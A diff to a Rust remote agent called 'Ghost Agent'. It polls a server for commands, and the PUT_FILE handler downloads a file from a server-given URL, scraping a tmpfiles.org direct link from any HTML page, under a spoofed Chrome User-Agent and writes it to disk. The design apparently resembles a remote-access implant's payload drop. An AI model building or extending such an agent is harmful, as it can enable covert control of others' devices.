@@ -50,7 +50,7 @@ struct CommandResponse {
 
 #[derive(Deserialize)]
 struct PendingCommand {
-    messageId: String,
+    message_id: String,
     command: String,
     args: Option<String>,
 }
@@ -68,7 +68,7 @@ struct FileEntry {
 async fn main() {
     println!("👻 Ghost Agent v2.1 - Enhanced Status Active...");
 
-    let mut config = load_or_create_config();
+    let config = load_or_create_config();
     println!("📱 Device ID: {}", config.device_id);
     
     let client = Client::builder()
@@ -281,7 +281,7 @@ async fn process_command(client: &Client, config: &Config, cmd: PendingCommand) 
                 }
             }
         },
-        "PUT_FILE" => {
+       "PUT_FILE" => {
             println!("📥 Processing PUT_FILE command...");
             if let Some(args_str) = cmd.args {
                 match serde_json::from_str::<serde_json::Value>(&args_str) {
@@ -303,7 +303,7 @@ async fn process_command(client: &Client, config: &Config, cmd: PendingCommand) 
                                 }
                             }
 
-                            // Build request with extra headers for compatibility
+                            // Build request with extra headers
                             let referer = url.replace("/dl/", "/");
                             let req = client.get(url)
                                 .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
@@ -325,28 +325,100 @@ async fn process_command(client: &Client, config: &Config, cmd: PendingCommand) 
                                         println!("📦 Received response from: {}", final_url);
                                         println!("📦 Type: {}, Size: {} bytes", content_type, content_length);
 
-                                        if content_type.contains("text/html") && content_length < 20000 {
-                                             println!("⚠️ Warning: Response seems to be an HTML page, not a file.");
-                                        }
+                                        if content_type.contains("text/html") {
+                                             println!("⚠️ Response is HTML. Attempting to parse for direct link...");
+                                             
+                                             match resp.bytes().await {
+                                                 Ok(body_bytes) => {
+                                                     let body_str = String::from_utf8_lossy(&body_bytes);
+                                                     let mut new_url = String::new();
+                                                     
+                                                     // Parsing logic
+                                                     if let Some(idx) = body_str.find("tmpfiles.org/dl/") {
+                                                         let prefix = &body_str[0..idx];
+                                                         if let Some(start_quote) = prefix.rfind('"').or_else(|| prefix.rfind('\'')).or_else(|| prefix.rfind(' ')) {
+                                                             let start = start_quote + 1;
+                                                             let suffix = &body_str[idx..];
+                                                             if let Some(end_quote) = suffix.find('"').or_else(|| suffix.find('\'')).or_else(|| suffix.find(' ')) {
+                                                                 let end = idx + end_quote;
+                                                                 new_url = body_str[start..end].to_string();
+                                                                 if new_url.starts_with("//") {
+                                                                     new_url = format!("https:{}", new_url);
+                                                                 }
+                                                             }
+                                                         }
+                                                     }
 
-                                        match resp.bytes().await {
-                                            Ok(bytes) => {
-                                                if bytes.is_empty() {
+                                                     if !new_url.is_empty() {
+                                                         println!("🔗 Found direct link in HTML: {}", new_url);
+                                                         
+                                                         // FIX IS HERE: removed '&' before 'url'
+                                                         let retry_req = client.get(&new_url)
+                                                             .header("Referer", url) 
+                                                             .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
+                                                             
+                                                         match retry_req.send().await {
+                                                             Ok(retry_resp) => {
+                                                                 if retry_resp.status().is_success() {
+                                                                     let retry_len = retry_resp.content_length().unwrap_or(0);
+                                                                     println!("📦 Retry Download Size: {} bytes", retry_len);
+                                                                     match retry_resp.bytes().await {
+                                                                         Ok(retry_bytes) => {
+                                                                             if std::fs::write(dest, &retry_bytes).is_ok() {
+                                                                                 println!("✅ File saved successfully from direct link!");
+                                                                                 response_data = Some(serde_json::json!({ "dest": dest, "recovered": true }));
+                                                                                 status = "DONE".to_string();
+                                                                             } else {
+                                                                                  status = "ERROR".to_string();
+                                                                                  response_data = Some(serde_json::json!({ "message": "Failed to write retry content" })); 
+                                                                             }
+                                                                         },
+                                                                         Err(e) => {
+                                                                             status = "ERROR".to_string();
+                                                                             response_data = Some(serde_json::json!({ "message": format!("Retry byte error: {}", e) }));
+                                                                         }
+                                                                     }
+                                                                 } else {
+                                                                     status = "ERROR".to_string();
+                                                                     response_data = Some(serde_json::json!({ "message": format!("Retry failed: HTTP {}", retry_resp.status()) }));
+                                                                 }
+                                                             },
+                                                             Err(e) => {
+                                                                 status = "ERROR".to_string();
+                                                                 response_data = Some(serde_json::json!({ "message": format!("Retry request failed: {}", e) }));
+                                                             }
+                                                         }
+                                                     } else {
+                                                         println!("❌ Could not find /dl/ link in HTML");
+                                                         status = "ERROR".to_string();
+                                                         response_data = Some(serde_json::json!({ "message": "HTML received but no direct link found" }));
+                                                     }
+                                                 },
+                                                 Err(e) => {
+                                                     status = "ERROR".to_string();
+                                                     response_data = Some(serde_json::json!({ "message": format!("Failed to read HTML body: {}", e) }));
+                                                 }
+                                             }
+                                        } else {
+                                            match resp.bytes().await {
+                                                Ok(bytes) => {
+                                                    if bytes.is_empty() {
+                                                        status = "ERROR".to_string();
+                                                        response_data = Some(serde_json::json!({ "message": "Downloaded file is empty" }));
+                                                    } else if let Err(e) = std::fs::write(dest, &bytes) {
+                                                        status = "ERROR".to_string();
+                                                        response_data = Some(serde_json::json!({ "message": format!("Write error: {}", e) }));
+                                                        println!("❌ Write error: {}", e);
+                                                    } else {
+                                                        println!("✅ File saved successfully! ({} bytes)", bytes.len());
+                                                        response_data = Some(serde_json::json!({ "dest": dest, "size": bytes.len() }));
+                                                    }
+                                                },
+                                                Err(e) => {
                                                     status = "ERROR".to_string();
-                                                    response_data = Some(serde_json::json!({ "message": "Downloaded file is empty" }));
-                                                } else if let Err(e) = std::fs::write(dest, &bytes) {
-                                                    status = "ERROR".to_string();
-                                                    response_data = Some(serde_json::json!({ "message": format!("Write error: {}", e) }));
-                                                    println!("❌ Write error: {}", e);
-                                                } else {
-                                                    println!("✅ File saved successfully! ({} bytes)", bytes.len());
-                                                    response_data = Some(serde_json::json!({ "dest": dest, "size": bytes.len() }));
+                                                    response_data = Some(serde_json::json!({ "message": format!("Byte stream error: {}", e) }));
+                                                    println!("❌ Byte stream error: {}", e);
                                                 }
-                                            },
-                                            Err(e) => {
-                                                status = "ERROR".to_string();
-                                                response_data = Some(serde_json::json!({ "message": format!("Byte stream error: {}", e) }));
-                                                println!("❌ Byte stream error: {}", e);
                                             }
                                         }
                                     } else {
@@ -385,7 +457,7 @@ async fn process_command(client: &Client, config: &Config, cmd: PendingCommand) 
     let payload = CommandResponse {
         action: "response".to_string(),
         device_id: config.device_id.clone(),
-        reply_to_id: cmd.messageId,
+        reply_to_id: cmd.message_id,
         status,
         data: response_data,
     };
